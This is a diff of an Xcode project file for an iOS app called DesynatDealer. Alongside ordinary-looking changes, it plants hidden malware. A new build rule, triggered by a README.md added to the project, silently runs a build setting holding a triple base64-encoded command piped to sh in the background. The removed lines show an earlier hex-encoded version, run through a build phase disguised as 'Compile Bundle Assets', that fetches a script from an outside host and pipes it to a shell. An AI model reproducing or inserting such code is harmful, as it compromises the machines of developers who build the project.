@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		9A879055D1D74E5EA0A5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = C165BD5AFAC841C281A5DE54; };
 		4924E8402ED543EB001B7996 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */; };
 		493DB73D2EAA6261008098A8 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB73C2EAA6261008098A8 /* Alamofire */; };
 		49B2EB432EB88B8E00EDC254 /* UploadImageModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49B2EB422EB88B8E00EDC254 /* UploadImageModel.swift */; };
@@ -638,6 +639,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		C165BD5AFAC841C281A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.debug.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.debug.xcconfig"; sourceTree = "<group>"; };
 		40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDealer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
@@ -1311,6 +1313,7 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				C165BD5AFAC841C281A5DE54 /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -2375,7 +2378,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB5D62EAA6212008098A8 /* Build configuration list for PBXNativeTarget "DesynatDealer" */;
 			buildPhases = (
-				E482DA5C88F849E18BA5DE54 /* Compile Bundle Assets */,
 				9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */,
 				493DB5BF2EAA6210008098A8 /* Sources */,
 				493DB5C02EAA6210008098A8 /* Frameworks */,
@@ -2384,6 +2386,7 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				29DAEA4B883D4DA187A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2440,11 +2443,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		29DAEA4B883D4DA187A5DE54 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A45ED5A}\"";
+			};
+			/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		493DB5C12EAA6210008098A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9A879055D1D74E5EA0A5DE54 /* README.md */,
 				6B38D1282EB3473B00C41192 /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				6B38D12A2EB3473B00C41192 /* Main.storyboard in Resources */,
@@ -3011,26 +3032,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		E482DA5C88F849E18BA5DE54 /* Compile Bundle Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -3187,7 +3188,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353633363137333734326536393665326636310a323932323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXbTFzYm1KWFJtcGFSelIxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
@@ -3229,7 +3230,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353633363137333734326536393665326636310a323932323230376332303733363830610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXbTFzYm1KWFJtcGFSelIxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
